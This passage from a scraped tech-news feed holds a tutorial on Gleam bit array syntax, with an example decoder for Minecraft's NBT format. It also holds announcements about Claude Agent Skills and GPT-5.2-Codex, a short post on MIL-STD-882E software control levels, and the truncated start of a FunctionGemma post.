    &lt;p&gt;There are several different data types that can appear as the value of a bit array segment, and each has a slightly different set of defaults, as well as options that can be used to modify how it is encoded.&lt;/p&gt;
    &lt;p&gt;The default assumed type is &lt;code&gt;Int&lt;/code&gt;, and if you want a segment that is a non-integer,
you need to specify that by using the type-specific option, unless you are using
a literal, in which case it is inferred automatically.&lt;/p&gt;
    &lt;head rend="h2"&gt;Segment types&lt;/head&gt;
    &lt;p&gt;As mentioned above, the default segment type is &lt;code&gt;Int&lt;/code&gt;. By default, integer
segments are encoded as an 8-bit signed integer, although this can be modified
using various options, which will be mentioned later.&lt;/p&gt;
    &lt;p&gt;The syntax for printing bit arrays with the &lt;code&gt;echo&lt;/code&gt; keyword uses 8-bit unsigned
integer segments to represent the structure of the bit array, so that is what I
will be using in the rest of this article to show the encoding of various bit
arrays.&lt;/p&gt;
    &lt;code&gt;echo &amp;lt;&amp;lt;1, 2, -3&amp;gt;&amp;gt;
// &amp;lt;&amp;lt;1, 2, 253&amp;gt;&amp;gt;
&lt;/code&gt;
    &lt;p&gt;Bit array syntax also allows for &lt;code&gt;Float&lt;/code&gt; segments. If you are not using a literal
float value, the &lt;code&gt;float&lt;/code&gt; option is required for the program to type-check. By
default, floats are encoded as 64-bit IEEE 754
floats, although the size can be changed to either 32 or 16 bit.&lt;/p&gt;
    &lt;code&gt;echo &amp;lt;&amp;lt;3.14&amp;gt;&amp;gt;
// &amp;lt;&amp;lt;64, 9, 30, 184, 81, 235, 133, 31&amp;gt;&amp;gt;

let some_float = 1.0
echo &amp;lt;&amp;lt;some_float&amp;gt;&amp;gt;
// Error: Expected type Int, found type Float

echo &amp;lt;&amp;lt;some_float:float&amp;gt;&amp;gt;
// &amp;lt;&amp;lt;63, 240, 0, 0, 0, 0, 0, 0&amp;gt;&amp;gt;
&lt;/code&gt;
    &lt;p&gt;Strings are another data type that can be used as a bit array segment. By default, strings are encoded in UTF-8, although this can be changed using the &lt;code&gt;utf16&lt;/code&gt; and &lt;code&gt;utf32&lt;/code&gt; options. The &lt;code&gt;utf8&lt;/code&gt; option can also
be used, when the value is not a literal.&lt;/p&gt;
    &lt;code&gt;echo &amp;lt;&amp;lt;"Hello 🌍"&amp;gt;&amp;gt;
// &amp;lt;&amp;lt;72, 101, 108, 108, 111, 32, 240, 159, 140, 141&amp;gt;&amp;gt;

echo &amp;lt;&amp;lt;"Hello 🌍":utf16&amp;gt;&amp;gt;
// &amp;lt;&amp;lt;0, 72, 0, 101, 0, 108, 0, 108, 0, 111, 0, 32, 216, 60, 223, 13&amp;gt;&amp;gt;

echo &amp;lt;&amp;lt;"Hello 🌍":utf32&amp;gt;&amp;gt;
// &amp;lt;&amp;lt;0, 0, 0, 72, 0, 0, 0, 101, 0, 0, 0, 108, 0, 0, 0, 108, 0, 0, 0, 111, 0, 0, 0, 32, 0, 1, 243, 13&amp;gt;&amp;gt;

let greeting = "Hello"
echo &amp;lt;&amp;lt;greeting&amp;gt;&amp;gt;
// Error: Expected type Int, found type String

echo &amp;lt;&amp;lt;greeting:utf8&amp;gt;&amp;gt;
// &amp;lt;&amp;lt;72, 101, 108, 108, 111&amp;gt;&amp;gt;
&lt;/code&gt;
    &lt;p&gt;UTF codepoints, using the built-in &lt;code&gt;UtfCodepoint&lt;/code&gt; type, are also possible to use
as bit array segments. These work similar to strings, but only represent a single
codepoint instead of multiple. Like strings, they can be encoded as UTF-8, UTF-16
or UTF-32, although they have differently named options: &lt;code&gt;utf8_codepoint&lt;/code&gt;,
&lt;code&gt;utf16_codepoint&lt;/code&gt; and &lt;code&gt;utf32_codepoint&lt;/code&gt;. Since there are no UTF codepoint literals,
on of these options is always required.&lt;/p&gt;
    &lt;code&gt;let assert [codepoint] = string.to_utf_codepoints("🌍")

echo &amp;lt;&amp;lt;codepoint&amp;gt;&amp;gt;
// Error: Expected type Int, found type UtfCodepoint

echo &amp;lt;&amp;lt;codepoint:utf8_codepoint&amp;gt;&amp;gt;
// &amp;lt;&amp;lt;240, 159, 140, 141&amp;gt;&amp;gt;

echo &amp;lt;&amp;lt;codepoint:utf16_codepoint&amp;gt;&amp;gt;
// &amp;lt;&amp;lt;216, 60, 223, 13&amp;gt;&amp;gt;

echo &amp;lt;&amp;lt;codepoint:utf32_codepoint&amp;gt;&amp;gt;
// &amp;lt;&amp;lt;0, 1, 243, 13&amp;gt;&amp;gt;
&lt;/code&gt;
    &lt;p&gt;The last data type that can be used is &lt;code&gt;BitArray&lt;/code&gt;. The encoding here is pretty
obvious, simply consisting of the bits inside the specified bit array. Bit array
segments must use the &lt;code&gt;bits&lt;/code&gt; option.&lt;/p&gt;
    &lt;code&gt;let bit_array = &amp;lt;&amp;lt;3, 4, 5&amp;gt;&amp;gt;

echo &amp;lt;&amp;lt;bit_array&amp;gt;&amp;gt;
// Error: Expected type Int, found type BitArray

echo &amp;lt;&amp;lt;bit_array:bits&amp;gt;&amp;gt;
// &amp;lt;&amp;lt;3, 4, 5&amp;gt;&amp;gt;

echo &amp;lt;&amp;lt;1, 2, bit_array:bits, 6&amp;gt;&amp;gt;
// &amp;lt;&amp;lt;1, 2, 3, 4, 5, 6&amp;gt;&amp;gt;
&lt;/code&gt;
    &lt;head rend="h2"&gt;Segment size&lt;/head&gt;
    &lt;p&gt;Possibly the most commonly used bit array option is &lt;code&gt;size&lt;/code&gt;. The &lt;code&gt;size&lt;/code&gt; option
allows you to customise the size that a particular segment has, specified in
bits.&lt;/p&gt;
    &lt;code&gt;echo &amp;lt;&amp;lt;1024:size(16)&amp;gt;&amp;gt;
// &amp;lt;&amp;lt;4, 0&amp;gt;&amp;gt;
&lt;/code&gt;
    &lt;p&gt;Since size is so commonly used, it even has a shorthand syntax that you can use, where the &lt;code&gt;size&lt;/code&gt; part is omitted:&lt;/p&gt;
    &lt;code&gt;echo &amp;lt;&amp;lt;1.0:32&amp;gt;&amp;gt;
// &amp;lt;&amp;lt;63, 128, 0, 0&amp;gt;&amp;gt;
&lt;/code&gt;
    &lt;p&gt;There is another option you can use in conjunction with &lt;code&gt;size&lt;/code&gt;: &lt;code&gt;unit&lt;/code&gt;. The &lt;code&gt;unit&lt;/code&gt;
option allows you to specify a value that is multiplied by the size. This is most
commonly useful for specifying sizes in bytes, but can be used for any size unit.&lt;/p&gt;
    &lt;code&gt;echo &amp;lt;&amp;lt;1024:2-unit(8)&amp;gt;&amp;gt;
// &amp;lt;&amp;lt;4, 0&amp;gt;&amp;gt;

echo &amp;lt;&amp;lt;12:3-unit(2)&amp;gt;&amp;gt;
// &amp;lt;&amp;lt;12:6&amp;gt;&amp;gt;
&lt;/code&gt;
    &lt;p&gt;For bit arrays which are not a whole number of bytes, the trailing bits at the end are suffixed with the number of bits.&lt;/p&gt;
    &lt;p&gt;There are some limitations to the &lt;code&gt;size&lt;/code&gt; option though. While it is unrestricted
on integer segments, float segments only support sizes of &lt;code&gt;16&lt;/code&gt;, &lt;code&gt;32&lt;/code&gt; or &lt;code&gt;64&lt;/code&gt;, as
other size floats are not well defined.&lt;/p&gt;
    &lt;p&gt;String and UTF codepoint segments cannot use the &lt;code&gt;size&lt;/code&gt; option; they have a fixed
size based on their value.&lt;/p&gt;
    &lt;p&gt;Bit array segments can use the &lt;code&gt;size&lt;/code&gt; option to truncate the bit array to a
particular size, but if the specified size is larger than the size of the bit
array, it will lead to a runtime error.&lt;/p&gt;
    &lt;head rend="h2"&gt;Endianness&lt;/head&gt;
    &lt;p&gt;By default, bit array segments are big endian, however it is possible to configure them to be little endian instead, using the &lt;code&gt;little&lt;/code&gt; option. There is a &lt;code&gt;big&lt;/code&gt; option too, but it does nothing other than
perhaps making the intention of the code clearer. There is also &lt;code&gt;native&lt;/code&gt;, which
chooses endianness based on the processor that is running the code.&lt;/p&gt;
    &lt;p&gt;Endianness is easiest to understand when it comes to integer segments, but it also applies to &lt;code&gt;Float&lt;/code&gt;s as well as UTF-16 and UTF-32 strings and codepoints.
It is not allowed for UTF-8 or bit array segments.&lt;/p&gt;
    &lt;p&gt;Endianness usually doesn't matter when using bit arrays internally; it is often only useful when it comes to interacting with a predefined API.&lt;/p&gt;
    &lt;head rend="h2"&gt;Pattern matching&lt;/head&gt;
    &lt;p&gt;The syntax shown until now has been for constructing bit arrays, but as mentioned at the beginning, bit array syntax can also used to pattern match on binary data and extract information from it. The syntax is largely the same, but there are some limitations and additional features when it comes to pattern matching.&lt;/p&gt;
    &lt;p&gt;In general, most of the syntax that can be used when constructing bit arrays can be used in the same way when pattern matching. You can either match on a specific literal, or assign the value to a variable.&lt;/p&gt;
    &lt;p&gt;One thing to note is that segment information is not stored in the bit array, so for example a &lt;code&gt;Float&lt;/code&gt; segment can be matched on as an &lt;code&gt;Int&lt;/code&gt;, and vice versa.&lt;/p&gt;
    &lt;code&gt;let assert &amp;lt;&amp;lt;x, y, z&amp;gt;&amp;gt; = &amp;lt;&amp;lt;1, 2, 3&amp;gt;&amp;gt;
echo #(x, y, z)
// #(1, 2, 3)

let assert &amp;lt;&amp;lt;1, a, 3&amp;gt;&amp;gt; = &amp;lt;&amp;lt;1, 2, 3&amp;gt;&amp;gt;
echo a
// 2

let assert &amp;lt;&amp;lt;x, y&amp;gt;&amp;gt; = &amp;lt;&amp;lt;3.14:16&amp;gt;&amp;gt;
echo #(x, y)
// #(66, 72)

let assert &amp;lt;&amp;lt;float:float-size(16)&amp;gt;&amp;gt; = &amp;lt;&amp;lt;60, 0&amp;gt;&amp;gt;
echo float
// 1.0
&lt;/code&gt;
    &lt;head rend="h3"&gt;Strings&lt;/head&gt;
    &lt;p&gt;One restriction to note is that arbitrary length strings cannot be matched on in this way. The following is an error:&lt;/p&gt;
    &lt;code&gt;let assert &amp;lt;&amp;lt;message:size(5)&amp;gt;&amp;gt; = &amp;lt;&amp;lt;"Hello"&amp;gt;&amp;gt;
&lt;/code&gt;
    &lt;p&gt;Because UTF-8 is variable sized, there's no guarantee that any given sequence of bytes is valid UTF-8. You can still match on UTF codepoints though, as well as string literals.&lt;/p&gt;
    &lt;code&gt;let assert &amp;lt;&amp;lt;"Hello", last_char&amp;gt;&amp;gt; = &amp;lt;&amp;lt;"Hello!"&amp;gt;&amp;gt;
echo last_char
// 33

let assert &amp;lt;&amp;lt;first:utf8_codepoint&amp;gt;&amp;gt; = &amp;lt;&amp;lt;81&amp;gt;&amp;gt;
echo first
// utfcodepoint(Q)
&lt;/code&gt;
    &lt;head rend="h3"&gt;Bits and bytes&lt;/head&gt;
    &lt;p&gt;For matching on bit arrays, there are two options: The &lt;code&gt;bits&lt;/code&gt; option that is used
in construction, and a second &lt;code&gt;bytes&lt;/code&gt; option, which only matches whole numbers of
bytes. If given an explicit size, that number of bits/bytes is matched. If the
&lt;code&gt;size&lt;/code&gt; option is not used, they match everything remaining in the bit array.&lt;/p&gt;
    &lt;p&gt;Note: When using the &lt;code&gt;bytes&lt;/code&gt; option, size is measured in bytes, and the &lt;code&gt;unit&lt;/code&gt;
option cannot be used. This is currently a bug in Gleam, you can track its status
here.&lt;/p&gt;
    &lt;code&gt;let assert &amp;lt;&amp;lt;_, bits:bits-size(12), _:size(4)&amp;gt;&amp;gt; = &amp;lt;&amp;lt;1, 2, 3&amp;gt;&amp;gt;
echo bits
// &amp;lt;&amp;lt;2, 0:4&amp;gt;&amp;gt;

let assert &amp;lt;&amp;lt;_, bytes:bytes-size(3), _&amp;gt;&amp;gt; = &amp;lt;&amp;lt;1, 2, 3, 4, 5&amp;gt;&amp;gt;
echo bits
// &amp;lt;&amp;lt;2, 3, 4&amp;gt;&amp;gt;

let assert &amp;lt;&amp;lt;first:4, rest:bits&amp;gt;&amp;gt; = &amp;lt;&amp;lt;1, 2, 3&amp;gt;&amp;gt;
echo rest
// &amp;lt;&amp;lt;16, 32, 3:4&amp;gt;&amp;gt;

let assert &amp;lt;&amp;lt;_, _, rest:bytes&amp;gt;&amp;gt; = &amp;lt;&amp;lt;1, 2, 3, 4, 5, 6&amp;gt;&amp;gt;
echo rest
// &amp;lt;&amp;lt;3, 4, 5, 6&amp;gt;&amp;gt;

let assert &amp;lt;&amp;lt;value:bytes&amp;gt;&amp;gt; = &amp;lt;&amp;lt;1, 2:2, 3&amp;gt;&amp;gt;
// Error: Pattern match failed
&lt;/code&gt;
    &lt;head rend="h3"&gt;Signedness&lt;/head&gt;
    &lt;p&gt;When matching on integers, they are treated by default as unsigned. If you want to match on a signed integer, the &lt;code&gt;signed&lt;/code&gt; option can be used, and the number is
interpreted using two's complement.
The &lt;code&gt;unsigned&lt;/code&gt; option also exists for consistency, but like &lt;code&gt;big&lt;/code&gt;, it does
nothing. Signedness only applies to integers and cannot be used with any other
type of segment.&lt;/p&gt;
    &lt;code&gt;let assert &amp;lt;&amp;lt;x&amp;gt;&amp;gt; = &amp;lt;&amp;lt;-1&amp;gt;&amp;gt;
echo x
// 255

let assert &amp;lt;&amp;lt;x:signed&amp;gt;&amp;gt; = &amp;lt;&amp;lt;255&amp;gt;&amp;gt;
echo x
// -1
&lt;/code&gt;
    &lt;head rend="h2"&gt;JavaScript support&lt;/head&gt;
    &lt;p&gt;Bit arrays are a feature of Erlang, built in to the BEAM virtual machine. This is what inspired the Gleam feature, and it means we get all this behaviour for free on the Erlang target. But on JavaScript, all features need to be implemented from scratch. While most of the Erlang behaviour already exists, a few features are still lacking. At the time of writing the two missing features are the &lt;code&gt;native&lt;/code&gt; option, and pattern matching on UTF codepoints. You can check the
tracking issue to see if any
progress has been made since.&lt;/p&gt;
    &lt;head rend="h2"&gt;Example&lt;/head&gt;
    &lt;p&gt;Now that we know about all the features of bit arrays, we can use them. Here is an example of a basic en/decoder for Minecraft's NBT format, using bit arrays.&lt;/p&gt;
    &lt;p&gt;First, we define our type to represent the NBT data:&lt;/p&gt;
    &lt;code&gt;pub type Nbt {
  Byte(Int)
  Short(Int)
  Int(Int)
  Long(Int)
  Float(Float)
  Double(Float)
  ByteArray(List(Int))
  IntArray(List(Int))
  LongArray(List(Int))
  String(String)
  List(List(Nbt))
  Compound(Dict(String, Nbt))
}
&lt;/code&gt;
    &lt;p&gt;Next, we can create a &lt;code&gt;decode&lt;/code&gt; function to turn a bit array into NBT:&lt;/p&gt;
    &lt;code&gt;pub fn decode(bits: BitArray) -&amp;gt; Nbt {
  // The first byte tells us what kind of data the value is
  case bits {
    &amp;lt;&amp;lt;1, byte:8-signed, _:bits&amp;gt;&amp;gt; -&amp;gt; Byte(byte)
    &amp;lt;&amp;lt;2, short:16-signed, _:bits&amp;gt;&amp;gt; -&amp;gt; Short(short)
    &amp;lt;&amp;lt;3, int:32-signed, _:bits&amp;gt;&amp;gt; -&amp;gt; Int(int)
    &amp;lt;&amp;lt;4, long:64-signed, _:bits&amp;gt;&amp;gt; -&amp;gt; Long(long)
    &amp;lt;&amp;lt;5, float:32-float, _:bits&amp;gt;&amp;gt; -&amp;gt; Float(float)
    &amp;lt;&amp;lt;6, double:64-float, _:bits&amp;gt;&amp;gt; -&amp;gt; Double(double)

    &amp;lt;&amp;lt;8, length:32, bytes:bytes-size(length), _:bits&amp;gt;&amp;gt; -&amp;gt; {
      // We can't match on arbitrary UTF-8 so we must extract the bytes then
      // convert it to a string.
      let assert Ok(string) = bit_array.to_string(bytes)
      String(string)
    }

    &amp;lt;&amp;lt;7, length:32-signed, bytes:bytes-size(length), _:bits&amp;gt;&amp;gt; -&amp;gt;
      ByteArray(bytes_to_list(bytes, 8, []))

    &amp;lt;&amp;lt;11, length:32-signed, bytes:bytes-size(length * 4), _:bits&amp;gt;&amp;gt; -&amp;gt;
      IntArray(bytes_to_list(bytes, 32, []))

    &amp;lt;&amp;lt;12, length:32-signed, bytes:bytes-size(length * 8), _:bits&amp;gt;&amp;gt; -&amp;gt;
      LongArray(bytes_to_list(bytes, 64, []))

    // Omitted for brevity
    &amp;lt;&amp;lt;9, _:bits&amp;gt;&amp;gt; -&amp;gt; todo
    &amp;lt;&amp;lt;10, _:bits&amp;gt;&amp;gt; -&amp;gt; todo
    // For the sake of this example, we will just crash the program here
    _ -&amp;gt; panic as "Invalid NBT"
  }
}
&lt;/code&gt;
    &lt;p&gt;The &lt;code&gt;bytes_to_list&lt;/code&gt; splits a bit array into n-bit chunks:&lt;/p&gt;
    &lt;code&gt;fn bytes_to_list(bytes: BitArray, chunk_size: Int, out: List(Int)) -&amp;gt; List(Int) {
  case bytes {
    &amp;lt;&amp;lt;first:size(chunk_size)-signed, rest:bytes&amp;gt;&amp;gt; -&amp;gt;
      bytes_to_list(rest, chunk_size, [first, ..out])
    _ -&amp;gt; list.reverse(out)
  }
}
&lt;/code&gt;
    &lt;p&gt;Finally, an &lt;code&gt;encode&lt;/code&gt; function to turn the NBT back into binary:&lt;/p&gt;
    &lt;code&gt;pub fn encode(nbt: Nbt) -&amp;gt; BitArray {
  case nbt {
    Byte(byte) -&amp;gt; &amp;lt;&amp;lt;1, byte:8&amp;gt;&amp;gt;
    Short(short) -&amp;gt; &amp;lt;&amp;lt;2, short:16&amp;gt;&amp;gt;
    Int(int) -&amp;gt; &amp;lt;&amp;lt;3, int:32&amp;gt;&amp;gt;
    Long(long) -&amp;gt; &amp;lt;&amp;lt;4, long:64&amp;gt;&amp;gt;
    Float(float) -&amp;gt; &amp;lt;&amp;lt;5, float:float-32&amp;gt;&amp;gt;
    Double(double) -&amp;gt; &amp;lt;&amp;lt;6, double:float-64&amp;gt;&amp;gt;

    // Append the tag (7), followed by each byte in the list
    ByteArray(bytes) -&amp;gt;
      list.fold(bytes, &amp;lt;&amp;lt;7&amp;gt;&amp;gt;, fn(out, byte) { &amp;lt;&amp;lt;out:bits, byte:8&amp;gt;&amp;gt; })
    IntArray(ints) -&amp;gt;
      list.fold(ints, &amp;lt;&amp;lt;11&amp;gt;&amp;gt;, fn(out, int) { &amp;lt;&amp;lt;out:bits, int:32&amp;gt;&amp;gt; })
    LongArray(longs) -&amp;gt;
      list.fold(longs, &amp;lt;&amp;lt;12&amp;gt;&amp;gt;, fn(out, long) { &amp;lt;&amp;lt;out:bits, long:64&amp;gt;&amp;gt; })

    String(string) -&amp;gt; &amp;lt;&amp;lt;8, string:utf8&amp;gt;&amp;gt;

    // Omitted for brevity
    List(_) -&amp;gt; todo
    Compound(_) -&amp;gt; todo
  }
}
&lt;/code&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://gearsco.de/blog/bit-array-syntax/"/><published>2025-12-18T16:37:22+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46315414</id><title>Agent Skills is now an open standard</title><updated>2025-12-18T20:39:04.188230+00:00</updated><content>&lt;doc fingerprint="dd141e2f0b27db6c"&gt;
  &lt;main&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;December 18, 2025&lt;/item&gt;
      &lt;item&gt;5min&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;In October, we introduced skillsâa way to teach Claude repeatable workflows tailored to how you work. Today we're making skills easier to deploy, discover, and build: organization-wide management for admins; a directory of partner-built skills from Notion, Canva, Figma, Atlassian, and others; and an open standard so skills work across AI platforms.&lt;/p&gt;
    &lt;head rend="h2"&gt;Manage skills across your organization&lt;/head&gt;
    &lt;p&gt;Claude Team and Enterprise plan admins can now provision skills centrally from admin settings. Admin-provisioned skills are enabled by default for all users. Users can still toggle individual skills off if they choose. This gives organizations consistent, approved workflows across teams while letting individual users customize their experience.&lt;/p&gt;
    &lt;head rend="h2"&gt;Discover, create, and edit new skills&lt;/head&gt;
    &lt;p&gt;Creating skills is now simpler. Describe what you want and Claude helps build it, or write instructions directly. For complex workflows, upload skill folders or use the skill-creator. Claude can also help you edit existing skills, and new previews show full contents so you can understand exactly what a skill does before enabling it.&lt;/p&gt;
    &lt;head rend="h2"&gt;Skills directory&lt;/head&gt;
    &lt;p&gt;A growing collection of partner-built skills is now available at claude.com/connectors.&lt;/p&gt;
    &lt;p&gt;Admins can provision these partner skills across their organization, giving teams immediate access to workflows for tools they already use without any custom development.&lt;/p&gt;
    &lt;head rend="h2"&gt;An open standard&lt;/head&gt;
    &lt;p&gt;We're also publishingÂ Agent Skills as an open standard. Like MCP, we believe skills should be portable across tools and platformsâthe same skill should work whether you're using Claude or other AI platforms. We've been collaborating with members of the ecosystem, and we're excited to see early adoption of the standard.&lt;/p&gt;
    &lt;head rend="h2"&gt;Getting started&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Claude Apps: Browse the skills directory and enable in Settings &amp;gt; Capabilities &amp;gt; Skills.&lt;/item&gt;
      &lt;item&gt;Claude Code: Install from the plugin directory or check skills into your repository.&lt;/item&gt;
      &lt;item&gt;Claude Developer Platform (API): Use skills via the /v1/skills endpoint. See documentation.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Admins can provision skills org-wide through Admin Settings. Skills require Code Execution and File Creation to be enabled.&lt;/p&gt;
    &lt;head rend="h2"&gt;Transform how your organization operates with Claude&lt;/head&gt;
    &lt;p&gt;Get the developer newsletter&lt;/p&gt;
    &lt;p&gt;Product updates, how-tos, community spotlights, and more. Delivered monthly to your inbox.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://claude.com/blog/organization-skills-and-directory"/><published>2025-12-18T17:04:32+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46315547</id><title>Military standard on software control levels</title><updated>2025-12-18T20:39:03.653301+00:00</updated><content>&lt;doc fingerprint="cd5f5d5cca4f29dc"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Military Standard on Software Control Levels&lt;/head&gt;
    &lt;p&gt;The mil-std-882e standard specifies levels of software control, i.e. how dangerous the software can be based on what it is responsible for. Although the standard is a little more complicated, we can simplify to essentially four levels:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;The most alarming case is when the software has direct control of something that can be immediately dangerous if the software does the wrong thing.&lt;/item&gt;
      &lt;item&gt;Still dangerous, but slightly less so is either (a) when the software has direct control, but there is a delay between when it does the wrong thing and when it becomes dangerous; or (b) when the software is not directly in control, but a human must immediately react to software signals and perform an action to prevent danger.1 E.g. the software commands a reactor shutdown when there are only seconds remaining until the reactor blows up.&lt;/item&gt;
      &lt;item&gt;Yet less dangerous is when the software is not in direct control, and there is time to verify its suggestion against independent methods to make sure the action recommended by the software is indeed appropriate.&lt;/item&gt;
      &lt;item&gt;The least dangerous is when software only has an auxiliary use and is not involved in controlling something serious.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I thought this was a neat way to look at things, and particularly salient now that llms and computer vision have blown open new opportunities for injecting software into processes in which software were previously subservient to humans.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://entropicthoughts.com/mil-std-882e-software-control"/><published>2025-12-18T17:12:46+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46316367</id><title>GPT-5.2-Codex</title><updated>2025-12-18T20:39:03.366140+00:00</updated><content>&lt;doc fingerprint="3f4b6dffd47fc68d"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Introducing GPT-5.2-Codex&lt;/head&gt;
    &lt;p&gt;The most advanced agentic coding model for professional software engineering and defensive cybersecurity.&lt;/p&gt;
    &lt;p&gt;Today we’re releasing GPT‑5.2-Codex, the most advanced agentic coding model yet for complex, real-world software engineering. GPT‑5.2-Codex is a version of GPT‑5.2 further optimized for agentic coding in Codex, including improvements on long-horizon work through context compaction, stronger performance on large code changes like refactors and migrations, improved performance in Windows environments, and significantly stronger cybersecurity capabilities.&lt;/p&gt;
    &lt;p&gt;As our models continue to advance along the intelligence frontier, we’ve observed that these improvements also translate to capability jumps in specialized domains such as cybersecurity. For example, just last week, a security researcher using GPT‑5.1-Codex-Max with Codex CLI found and responsibly disclosed(opens in a new window) a vulnerability in React that could lead to source code exposure.&lt;/p&gt;
    &lt;p&gt;GPT‑5.2-Codex has stronger cybersecurity capabilities than any model we’ve released so far. These advances can help strengthen cybersecurity at scale, but they also raise new dual-use risks that require careful deployment. While GPT‑5.2-Codex does not reach a ‘High’ level of cyber capability under our Preparedness Framework, we’re designing our deployment approach with future capability growth in mind.&lt;/p&gt;
    &lt;p&gt;We're releasing GPT‑5.2-Codex today in all Codex surfaces for paid ChatGPT users, and working towards safely enabling access to GPT‑5.2-Codex for API users in the coming weeks. In parallel, we’re piloting invite-only trusted access to upcoming capabilities and more permissive models for vetted professionals and organizations focused on defensive cybersecurity work. We believe that this approach to deployment will balance accessibility with safety.&lt;/p&gt;
    &lt;p&gt;GPT‑5.2-Codex builds on GPT‑5.2’s strengths in professional knowledge work and GPT‑5.1-Codex-Max’s frontier agentic coding and terminal-using capabilities. GPT‑5.2-Codex is now better at long-context understanding, reliable tool calling, improved factuality, and native compaction, making it a more dependable partner for long running coding tasks, while remaining token-efficient in its reasoning.&lt;/p&gt;
    &lt;p&gt;GPT‑5.2-Codex achieves state-of-the-art performance on SWE-Bench Pro and Terminal-Bench 2.0, benchmarks designed to test agentic performance on a wide variety of tasks in realistic terminal environments. It is also much more effective and reliable at agentic coding in native Windows environments, building on capabilities introduced in GPT‑5.1-Codex-Max.&lt;/p&gt;
    &lt;p&gt;With these improvements, Codex is more capable at working in large repositories over extended sessions with full context intact. It can more reliably complete complex tasks like large refactors, code migrations, and feature builds — continuing to iterate without losing track, even when plans change or attempts fail.&lt;/p&gt;
    &lt;p&gt;Stronger vision performance enables GPT‑5.2-Codex to more accurately interpret screenshots, technical diagrams, charts, and UI surfaces shared during coding sessions.&lt;/p&gt;
    &lt;p&gt;Codex can take design mocks and quickly translate them to functional prototypes, and you can pair with Codex to take these prototypes to production.&lt;/p&gt;
    &lt;head rend="h5"&gt;Design mock&lt;/head&gt;
    &lt;head rend="h5"&gt;Prototype generated by GPT-5.2-Codex&lt;/head&gt;
    &lt;p&gt;When charting performance on one of our core cybersecurity evaluations over time, we see a sharp jump in capability starting with GPT‑5-Codex, another large jump with GPT‑5.1-Codex-Max and now a third jump with GPT‑5.2-Codex. We expect that upcoming AI models will continue on this trajectory. In preparation, we are planning and evaluating as though each new model could reach ‘High’ levels of cybersecurity capability, as measured by our Preparedness Framework(opens in a new window). While GPT‑5.2-Codex has not yet reached ‘High’ level of cyber capability, we are preparing for future models that cross that threshold. Due to the increased cyber capabilities, we have added additional safeguards in the model and in the product, which are outlined in the system card.&lt;/p&gt;
    &lt;p&gt;Modern society runs on software, and its reliability depends on strong cybersecurity—keeping critical systems in banking, healthcare, communications, and essential services online, protecting sensitive data, and ensuring people can trust the software they rely on every day. Vulnerabilities can exist long before anyone knows about them, and finding, validating, and fixing them often depends on a community of engineers and independent security researchers equipped with the right tools.&lt;/p&gt;
    &lt;p&gt;On December 11, 2025, the React team published three security vulnerabilities affecting apps built with React Server Components. What made this disclosure notable was not only the vulnerabilities themselves, but how they were uncovered.&lt;/p&gt;
    &lt;p&gt;Andrew MacPherson, a principal security engineer at Privy (a Stripe company), was using GPT‑5.1-Codex-Max with Codex CLI and other coding agents to reproduce and study a different critical React vulnerability disclosed the week prior, known as React2Shell(opens in a new window) (CVE-2025-55182(opens in a new window)). His goal was to evaluate how well the model could assist with real-world vulnerability research.&lt;/p&gt;
    &lt;p&gt;He initially attempted several zero-shot analyses, prompting the model to examine the patch and identify the vulnerability it addressed. When that did not yield results, he shifted to a higher-volume, iterative prompting approach. When those approaches did not succeed, he guided Codex through standard defensive security workflows—setting up a local test environment, reasoning through potential attack surfaces, and using fuzzing to probe the system with malformed inputs. While attempting to reproduce the original React2Shell issue, Codex surfaced unexpected behaviors that warranted deeper investigation. Over the course of a single week, this process led to the discovery of previously unknown vulnerabilities, which were responsibly disclosed to the React team.&lt;/p&gt;
    &lt;p&gt;This demonstrates how advanced AI systems can materially accelerate defensive security work in widely used, real-world software. At the same time, capabilities that help defenders move faster can also be misused by bad actors.&lt;/p&gt;
    &lt;p&gt;As agentic systems become more capable in cybersecurity-relevant tasks, we are making it a core priority to ensure these advances are deployed responsibly—pairing every gain in capability with stronger safeguards, tighter access controls, and ongoing collaboration with the security community.&lt;/p&gt;
    &lt;p&gt;Security teams can run into restrictions when attempting to emulate threat actors, analyze malware to support remediation, or stress test critical infrastructure. We are developing a trusted access pilot to remove that friction for qualifying users and organizations and enable trusted defenders to use frontier AI cyber capabilities to accelerate cyberdefense.&lt;/p&gt;
    &lt;p&gt;Initially the pilot program will be invite-only for vetted security professionals with a track record of responsible vulnerability disclosure and organizations with a clear professional cybersecurity use case. Qualifying participants will get access to our most capable models for defensive use-cases to enable legitimate dual-use work.&lt;/p&gt;
    &lt;p&gt;If you’re a security professional or part of an organization doing ethical security work like vulnerability research or authorized red-teaming, we invite you to express interest in joining and share feedback on what you’d like to see from the program here(opens in a new window).&lt;/p&gt;
    &lt;p&gt;GPT‑5.2-Codex represents a step forward in how advanced AI can support real-world software engineering and specialized domains like cybersecurity—helping developers and defenders tackle complex, long-horizon work, and strengthening the tools available for responsible security research.&lt;/p&gt;
    &lt;p&gt;By rolling GPT‑5.2-Codex out gradually, pairing deployment with safeguards, and working closely with the security community, we’re aiming to maximize defensive impact while reducing the risk of misuse. What we learn from this release will directly inform how we expand access over time as the software and cyber frontiers continue to advance.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://openai.com/index/introducing-gpt-5-2-codex/"/><published>2025-12-18T18:14:48+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46316533</id><title>FunctionGemma 270M Model</title><updated>2025-12-18T20:39:03.236579+00:00</updated><content>&lt;doc fingerprint="9dd7ecd2c69883e3"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;FunctionGemma: Bringing bespoke function calling to the edge&lt;/head&gt;
